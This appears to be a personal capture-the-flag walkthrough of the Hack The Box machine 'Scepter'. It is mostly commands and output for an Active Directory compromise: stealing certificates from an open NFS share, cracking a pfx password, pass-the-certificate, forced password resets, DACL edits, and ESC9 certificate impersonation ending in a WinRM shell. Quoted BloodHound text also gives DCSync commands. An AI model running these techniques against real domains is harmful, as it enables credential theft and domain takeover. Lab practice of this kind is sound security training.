## HOST RECON

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl
2049/tcp open  nfs
3269/tcp open  globalcatLDAPssl
5986/tcp open  wsmans



111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status


389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-30T02:13:26
|_  start_date: N/A
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
```

#### mount remote fs on local machine and get certificate files

- https://the-pentesting-guide.marmeus.com/active/services/111-rpcbind

```
└─$ showmount -e 10.10.11.65
Export list for 10.10.11.65:
/helpdesk (everyone)


└─$ sudo mount -v -t nfs 10.10.11.65:helpdesk helpdesk -o nolock
mount.nfs: timeout set for Tue Apr 29 15:10:51 2025
mount.nfs: trying text-based options 'nolock,vers=4.2,addr=10.10.11.65,clientaddr=10.10.15.34'
mount.nfs: mount(2): Protocol not supported
mount.nfs: trying text-based options 'nolock,vers=4,minorversion=1,addr=10.10.11.65,clientaddr=10.10.15.34'


└─$ sudo ls helpdesk                                            
baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
```

```
└─$ cat baker.crt 
Bag Attributes
    friendlyName: 
    localKeyID: DC 2B 20 65 C3 0D 91 40 E8 37 B5 CC 06 0F EA 66 5D 3B 7C 4E 
subject=DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

- https://github.com/attackdebris/kerberos_enum_userlists
```
2025/04/29 23:39:19 >  [+] VALID USERNAME:       A.CARTER@scepter.htb
2025/04/29 23:39:51 >  [+] VALID USERNAME:       D.BAKER@scepter.htb
2025/04/29 23:40:27 >  [+] VALID USERNAME:       H.BROWN@scepter.htb
2025/04/29 23:41:43 >  [+] VALID USERNAME:       P.ADAMS@scepter.htb
```

- all .pfx has same password
```
└─$ pfx2john usename.pfx > username.pfx.hash

└─$ john clark.pfx.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 

newpassword      (clark.pfx)
```

```
└─$ certipy cert -pfx username.pfx -password newpassword -nokey -out username.crt

└─$ cat username.crt                                                          
-----BEGIN CERTIFICATE-----
MIIGEzCCBPugAwIBAgITYgAAACgnW4JdeWiXOwAAAAAAKDANBgkqhkiG9w0BAQsF
ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl

- decode base64 and get valid username
```

- valid users
```
d.baker
m.clark
e.lewis
o.scott
a.carter
h.brown
p.adams
```

- m.clark, o.scott, e.lewis
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked" 


- https://stackoverflow.com/questions/6307886/how-to-create-pfx-file-from-certificate-and-private-key
- put password newpassword only in phrase for baker.key

```
└─$ sudo openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt
```

- get nthash of d.baker
- https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate

```
└─$ faketime -f +8hr certipy auth -pfx baker.pfx -dc-ip 10.10.11.65 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

## enum with d.baker creds

```
└─$ netexec smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --rid-brute | grep SidTypeUser
SMB                      10.10.11.65     445    DC01             500: SCEPTER\Administrator (SidTypeUser)
SMB                      10.10.11.65     445    DC01             501: SCEPTER\Guest (SidTypeUser)
SMB                      10.10.11.65     445    DC01             502: SCEPTER\krbtgt (SidTypeUser)
SMB                      10.10.11.65     445    DC01             1000: SCEPTER\DC01$ (SidTypeUser)
SMB                      10.10.11.65     445    DC01             1106: SCEPTER\d.baker (SidTypeUser)
SMB                      10.10.11.65     445    DC01             1107: SCEPTER\a.carter (SidTypeUser)
SMB                      10.10.11.65     445    DC01             1108: SCEPTER\h.brown (SidTypeUser)
SMB                      10.10.11.65     445    DC01             1109: SCEPTER\p.adams (SidTypeUser)
SMB                      10.10.11.65     445    DC01             2101: SCEPTER\e.lewis (SidTypeUser)
SMB                      10.10.11.65     445    DC01             2102: SCEPTER\o.scott (SidTypeUser)
SMB                      10.10.11.65     445    DC01             2103: SCEPTER\M.clark (SidTypeUser)
```

```
└─$ netexec smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --rid-brute | grep SidTypeGroup
SMB                      10.10.11.65     445    DC01             498: SCEPTER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             512: SCEPTER\Domain Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             513: SCEPTER\Domain Users (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             514: SCEPTER\Domain Guests (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             515: SCEPTER\Domain Computers (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             516: SCEPTER\Domain Controllers (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             518: SCEPTER\Schema Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             519: SCEPTER\Enterprise Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             520: SCEPTER\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             521: SCEPTER\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             522: SCEPTER\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             525: SCEPTER\Protected Users (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             526: SCEPTER\Key Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             527: SCEPTER\Enterprise Key Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1102: SCEPTER\DnsUpdateProxy (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1103: SCEPTER\staff (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1104: SCEPTER\IT Support (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1105: SCEPTER\Helpdesk Admins (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1111: SCEPTER\Replication Operators (SidTypeGroup)
SMB                      10.10.11.65     445    DC01             1601: SCEPTER\CMS (SidTypeGroup)
```

```
└─$ netexec ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(sAMAccountName=d.baker)" ""
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.65     389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
LDAP        10.10.11.65     389    DC01             [+] Response for object: CN=d.baker,OU=Staff Access Certificate,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             objectClass:         top person organizationalPerson user
LDAP        10.10.11.65     389    DC01             cn:                  d.baker
LDAP        10.10.11.65     389    DC01             userCertificate:     0x3082064c30820534a00302010202136200000032e1a5c3915131097b000000000032300d06092a864886f70d01010b0500304831133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572311830160603550403130f736365707465722d444330312d4341301e170d3234313130323031313334365a170d3235313130323031313334365a307431133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572310e300c0603550403130555736572733110300e06035504031307642e62616b65723122302006092a864886f70d0109011613642e62616b657240736365707465722e68746230820122300d06092a864886f70d01010105000382010f003082010a0282010100a5838f1c7b70f02b08212ea6164a08f02b43e48e13bb7e890d239b767619919d5e296fd589fd6b5cbf4b1f290a8496d31ae26c1034872adee662cd2be3d254dc7ad6d99228b2e2214aadb981caa5ef7b6723b46809cf27eb35190506a21096db5c085c289d5391aadcdd95f753d687a0a92494c261c87d350ffdf1bc6b0ce976c21476f2dc79a7c28b8aa61f7f6bb7b65cfca71e762fc1b5373ce9093e6f8fe392a8e6bd7c56e10b74724118e571f7f68ec6a43dc14d51aa2e0eef5d5d5807a7afcc1f1b42142049b68663ca01f009c3e74a829b297bd4ed519949b3433864b6bfc5d85dc929abf6c9ebca2ae04980fd284cd6c7ed0db2a6877e63356aab19130203010001a3820301308202fd301d0603551d0e041604143794cc57e3a4cb55631a478f83d06e50c2346351301f0603551d23041830168014eb905438d2a66c896acb6d4da4ba7515601527e33081ca0603551d1f0481c23081bf3081bca081b9a081b68681b36c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d646330312c434e3d4344502c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f63657274696669636174655265766f636174696f6e4c6973743f626173653f6f626a656374436c6173733d63524c446973747269627574696f6e506f696e743081c106082b060105050701010481b43081b13081ae06082b060105050730028681a16c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d4149412c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f634143657274696669636174653f626173653f6f626a656374436c6173733d63657274696669636174696f6e417574686f72697479301706092b0601040182371402040a1e080055007300650072300e0603551d0f0101ff0404030205a030290603551d2504223020060a2b0601040182370a030406082b0601050507030406082b0601050507030230430603551d11043c303aa023060a2b060104018237140203a0150c13642e62616b657240736365707465722e6874628113642e62616b657240736365707465722e687462304b06092b0601040182371902043e303ca03a060a2b060104018237190201a02c042a532d312d352d32312d37343837393534362d3931363831383433342d3734303239353336352d31313036304406092a864886f70d01090f04373035300e06082a864886f70d030202020080300e06082a864886f70d030402020080300706052b0e030207300a06082a864886f70d0307300d06092a864886f70d01010b0500038201010055983d9fd8f264aca37ce2d6abfb26cf9789dd1b67a481de3511bed40497c0a0a9da332aeacaf3dc6d34f35745471ae0000dbd4380a5a44030ddcbfddfb5ea6cf17bd0c40d6bc151deeb55122b48bf3ceb01abc3e60825018cc41e882a71c66eee2dda041438c420b9fb17dba294f6ac4ce960ba547ba761a39efb14be01330432563a1c278d99f840fa8bc7da24695d6b6e0ca1128c7246e59277a58a387d3e3b6b60ed01ce3168df341026879b0b5aaab32b222fad8fc0172c0ada0d526d95314d6fcd3eb777c5f85b6d2f6f878dc1bc3a9d6ca702a414b96c4f7ed088574eb5ad97fd5d6ba024aad7f1318481d6af9bb6b6443127172647c99b6ccfb4b56a 0x30820613308204fba0030201020213620000002d195e6ebdea85db2500000000002d300d06092a864886f70d01010b0500304831133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572311830160603550403130f736365707465722d444330312d4341301e170d3234313130323031303831365a170d3235313130323031303831365a305031133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572310e300c0603550403130555736572733110300e06035504031307642e62616b657230820122300d06092a864886f70d01010105000382010f003082010a0282010100e0f8661ed18789297c43264aafb6c6066b90337836272ef3fb5e44377920d8c11ac486947f210fe9e882d36c5f215064a1bef97bee74d24217812f2b32a3f2c09a42f4b7be17c7f4275a1f6fade25dbb50a5d8457d86d5b80b0d633de305cb690f9944bafe45a7a34efa9ef04a7de51e5b071f0190b83301521d36b2d13760913589424a0c4f542c5af226d696ebab97f4675962fdd35b971ab5484e3efa5b29537f30989c1ae1b30bec9d8b933e330a5ecea014685a5a2bb03e44b534bfe419585daf595bcc6193a04ebbb69c536418a8802d1dd9629727d2f976c53f9fd8b0113b6dbf8fc1a720e1bee465dce73183f63cffed8a8af90c926e9a2cf12e25f90203010001a38202ec308202e8301d0603551d0e041604143f73b0a80796fc6a3ad432c4d7a81a5739a873a2301f0603551d23041830168014eb905438d2a66c896acb6d4da4ba7515601527e33081ca0603551d1f0481c23081bf3081bca081b9a081b68681b36c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d646330312c434e3d4344502c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f63657274696669636174655265766f636174696f6e4c6973743f626173653f6f626a656374436c6173733d63524c446973747269627574696f6e506f696e743081c106082b060105050701010481b43081b13081ae06082b060105050730028681a16c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d4149412c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f634143657274696669636174653f626173653f6f626a656374436c6173733d63657274696669636174696f6e417574686f72697479301706092b0601040182371402040a1e080055007300650072300e0603551d0f0101ff0404030205a030290603551d2504223020060a2b0601040182370a030406082b0601050507030406082b06010505070302302e0603551d1104273025a023060a2b060104018237140203a0150c13642e62616b657240736365707465722e687462304b06092b0601040182371902043e303ca03a060a2b060104018237190201a02c042a532d312d352d32312d37343837393534362d3931363831383433342d3734303239353336352d31313036304406092a864886f70d01090f04373035300e06082a864886f70d030202020080300e06082a864886f70d030402020080300706052b0e030207300a06082a864886f70d0307300d06092a864886f70d01010b05000382010100177a3df5eb8aaf07b9fb1a8a69de2a118ad4ec83091fe0c969ecca1f2582caab941ddf1d55885cc188f152c5547237fac659966fdd30e05d17d2778f8f6701407630146dabb24d04b0c92f7daa0d46b28dfa20425081c5d31928da67cef2797f1febefe0e0a91e63e3f5c57398c203f7e350eb0d8574a8ba502c5e9f34d30660916143e6eb831381c90cb65b25f93d0158a257883389da6690537d775b7bd621f553791c04ff4b4570e64ea6a7ce38454e2b4e09b7be071a58da9c06c03b6e6221b3b06d3289d7f727cf3df2299f836f671aadfea0daa2fce76c276ba8d4d586af15fa4fb03320c5c65433d77f87b7db0c727909ef35dda0425a66fda3ee13a4 0x3082064c30820534a00302010202136200000005124e1038b0e09705000000000005300d06092a864886f70d01010b0500304831133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572311830160603550403130f736365707465722d444330312d4341301e170d3234313130313030343033325a170d3235313130313030343033325a307431133011060a0992268993f22c640119160368746231173015060a0992268993f22c640119160773636570746572310e300c0603550403130555736572733110300e06035504031307642e62616b65723122302006092a864886f70d0109011613682e62726f776e40736365707465722e68746230820122300d06092a864886f70d01010105000382010f003082010a0282010100c02170e3cd79e0a5835b863b3f8f5b3d260fb671fa36dfe8b2da63f4ccd41f3c9b798b9b996e952594ca42a1467151c860b6a0c14d6c9bd607733f2b87604fd496ba0e4cff818b69e7a3a1a3fa61ec2997b3994487ede4e8e49046cd7a552e70f7df04081550c9f472efbed3f26df2bc7794ea5aa2082b30ae738fe34c052302ebac5f8f8ebb9525a8457318f298672cbde0d3d80b5dd65c16e117da1ed59af09865e478fa68dac4d240c3f15006a908a0c4c69aec8351dd1413649b2ea2569373e0ca41abdf856688d087734314a7355f07c6bcb99e32be02f52a950585f319283abc1586092cc2e8ce65e9b9eebc3397334c2a2763ccb92d2cd6f9094338010203010001a3820301308202fd301706092b0601040182371402040a1e08005500730065007230290603551d2504223020060a2b0601040182370a030406082b0601050507030406082b06010505070302300e0603551d0f0101ff0404030205a0304406092a864886f70d01090f04373035300e06082a864886f70d030202020080300e06082a864886f70d030402020080300706052b0e030207300a06082a864886f70d0307301d0603551d0e041604142c60db74953df29a8c821726baf2d2c465f0efa2301f0603551d23041830168014eb905438d2a66c896acb6d4da4ba7515601527e33081ca0603551d1f0481c23081bf3081bca081b9a081b68681b36c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d646330312c434e3d4344502c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f63657274696669636174655265766f636174696f6e4c6973743f626173653f6f626a656374436c6173733d63524c446973747269627574696f6e506f696e743081c106082b060105050701010481b43081b13081ae06082b060105050730028681a16c6461703a2f2f2f434e3d736365707465722d444330312d43412c434e3d4149412c434e3d5075626c69632532304b657925323053657276696365732c434e3d53657276696365732c434e3d436f6e66696775726174696f6e2c44433d736365707465722c44433d6874623f634143657274696669636174653f626173653f6f626a656374436c6173733d63657274696669636174696f6e417574686f7269747930430603551d11043c303aa023060a2b060104018237140203a0150c13642e62616b657240736365707465722e6874628113682e62726f776e40736365707465722e687462304b06092b0601040182371902043e303ca03a060a2b060104018237190201a02c042a532d312d352d32312d37343837393534362d3931363831383433342d3734303239353336352d31313036300d06092a864886f70d01010b0500038201010067d61a8bff4c38d805740edda32e94938f30e302b081e0ea9ac5fb59908e27777dd4c1f6f21f11f08120fc005bfa14c868ef58bc77b043af58bda036896104125214a469b5607a4825a7b00888c1cb97bd03d8f50d6c71449e6414197ac9f49f076beb160d221812557ad4637a53d0062affdb1e743815265209752415edff8e045eee6e0e28f00a58cd1cb23d5f082878f97014d84d043a477a069aea57f14febb9af637b093a3d2e89555c4998d99e621f2c775742236c71cf9005cc1494bc46236e2bd98d9cd9e3de58d99fe5f2a065fcf8ea173d7f911decc28a128b85896b40a376ebf177d414941298f6c6099d82d37ac5b37f8ef644834991a32f7ef9                                                                                                                                                                     
LDAP        10.10.11.65     389    DC01             givenName:           d.baker
LDAP        10.10.11.65     389    DC01             distinguishedName:   CN=d.baker,OU=Staff Access Certificate,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             instanceType:        4
LDAP        10.10.11.65     389    DC01             whenCreated:         20241031223902.0Z
LDAP        10.10.11.65     389    DC01             whenChanged:         20250501000603.0Z
LDAP        10.10.11.65     389    DC01             displayName:         d.baker
LDAP        10.10.11.65     389    DC01             uSNCreated:          16429
LDAP        10.10.11.65     389    DC01             memberOf:            CN=staff,CN=Users,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             uSNChanged:          156020
LDAP        10.10.11.65     389    DC01             name:                d.baker
LDAP        10.10.11.65     389    DC01             objectGUID:          0xfd23473c48256649b26d67bf2e549530
LDAP        10.10.11.65     389    DC01             userAccountControl:  66048
LDAP        10.10.11.65     389    DC01             badPwdCount:         0
LDAP        10.10.11.65     389    DC01             codePage:            0
LDAP        10.10.11.65     389    DC01             countryCode:         0
LDAP        10.10.11.65     389    DC01             badPasswordTime:     133905316708821786
LDAP        10.10.11.65     389    DC01             lastLogoff:          0
LDAP        10.10.11.65     389    DC01             lastLogon:           133905317026946957
LDAP        10.10.11.65     389    DC01             logonHours:          0xffffffffffffffffffffffffffffffffffffffffff
LDAP        10.10.11.65     389    DC01             pwdLastSet:          133905315638509115
LDAP        10.10.11.65     389    DC01             primaryGroupID:      513
LDAP        10.10.11.65     389    DC01             objectSid:           0x0105000000000005150000003a927604028aa536c502202c52040000
LDAP        10.10.11.65     389    DC01             accountExpires:      0
LDAP        10.10.11.65     389    DC01             logonCount:          12
LDAP        10.10.11.65     389    DC01             sAMAccountName:      d.baker
LDAP        10.10.11.65     389    DC01             sAMAccountType:      805306368
LDAP        10.10.11.65     389    DC01             userPrincipalName:   d.baker@scepter.htb
LDAP        10.10.11.65     389    DC01             objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=scepter,DC=htb
LDAP        10.10.11.65     389    DC01             dSCorePropagationData: 20250501000604.0Z 20250501000603.0Z 20250430235104.0Z 20250430235103.0Z 16010101000000.0Z
LDAP        10.10.11.65     389    DC01             lastLogonTimestamp:  133905283614447805
LDAP        10.10.11.65     389    DC01             msDS-SupportedEncryptionTypes: 0

```

```
└─$ netexec ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --dns-server 10.10.11.65 --bloodhound --collection All
```

## bh data

```
- d.baker ---> ForceChangePassowrd ---> a.carter
          |__ memberof ---> Staff

- a.carter ---> memberof ---> IT Support ---> GenericAll ---> OU Staff Access Certificate

Control of the Organization Unit

With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:

Generic Descendent Object Takeover

The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'

Now, the "JKOHLER" user will have full control of all descendent objects of each type.

Targeted Descendent Object Takeoever

If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this.

Objects for which ACL inheritance is disabled

It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs.

In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them.

Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup.

From a Linux machine, the gPLink manipulation attack vector may be exploited using the OUned.py tool. For a detailed outline of exploit requirements and implementation, you can refer to the article associated to the OUned.py tool.

Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO.

Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands.

- m.clark ---> no outbound path

- e.lewis ---> no outbound path

- o.scott ---> no outbound path

- h.brown ---> memberof ---> Helpdesk Admins, CMS, Remote Management Users

- p.adams ---> membersof ---> Replication Operations ---> GetChangesInFilteredSet, GetChangesAll, GetChanges ---> domain Scepter.htb

The members of the group REPLICATION OPERATORS@SCEPTER.HTB have the DS-Replication-Get-Changes-All permission on the domain SCEPTER.HTB.

Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.

With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:

lsadump::dcsync /domain:testlab.local /user:Administrator

secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'

You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab.
```

#### attack path 

- use d.baker and a.carter to get access over h.brown and get shell.

- d.baker can change password of a.carter

- a.carter can change objects/rights of OU Staff Access Certificate childs

- d.baker has ESC9 Certificate vulnerable with email field changeble to impersonate other user


```
└─$ certipy find -u d.baker -hashes 18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -vulnerable

...


1
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail    |
                                          SubjectRequireDnsAsCn  | <================
                                          SubjectAltRequireEmail |
    Enrollment Flag                     : NoSecurityExtension | <================
                                          AutoEnrollment
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities                                                                                          | <=====================
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension |
```

- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension


#### Force change password

- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

```
└─$ bloodyAD -u d.baker -p :18b5fb0d99e7a475316213c15b6f22ce -d scepter.htb --host 10.10.11.65 set password a.carter Pass123                  
[+] Password changed successfully!
```

#### Set rights for a.carter

- bh sujest

```
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal a.carter -target-dn "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" "scepter.htb/a.carter:Pass123" 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250519-002333.bak
[*] DACL modified successfully!
```

#### Set mail in d.baker to impersonate h.brown

```
└─$ bloodyAD -d scepter.htb -u a.carter -p Pass123 --host 10.10.11.65 set object d.baker mail -v h.brown@scepter.htb
[+] d.baker's mail has been updated
```

#### Request new d.baker certificate with new mail

```
faketime -f +8hr certipy req -dc-ip 10.10.11.65 -username "d.baker@scepter.htb" -hashes :18b5fb0d99e7a475316213c15b6f22ce -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'd.baker.pfx'
[*] Wrote certificate and private key to 'd.baker.pfx'
```


#### At last auth with pfx impersonated certificate and get h.brown creds

```
└─$ faketime -f +8hr certipy auth -pfx d.baker.pfx -username h.brown -dc-ip 10.10.11.65 -domain scepter.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'h.brown@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'h.brown.ccache'
[*] Wrote credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```


## h.brown creds

- h.brown has part of Protected Users so most actions will not be allowed

```
└─$ netexec smb 10.10.11.65 -u h.brown -H 4ecf5242092c6fb8c360a08069c75a0c                      
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [-] scepter.htb\h.brown:4ecf5242092c6fb8c360a08069c75a0c STATUS_ACCOUNT_RESTRICTION 
```

- I really hate this shit about using realms to connect with kerberos, it always seems like it doesn't work at all. I had to resort to chatgpt to get a config file that worked.

```
└─$ export KRB5CCNAME=h.brown.ccache
```

```
/etc/hosts

10.10.11.65  dc01.scepter.htb scepter.htb
```


```
└─$ cat /etc/krb5.conf                                                                                            
[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
```

```
└─$ faketime -f +8hr evil-winrm -i dc01.scepter.htb -r scepter.htb


*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==========================================
scepter\h.brown S-1-5-21-74879546-916818434-740295365-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                        Attributes
=========================================== ================ ========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
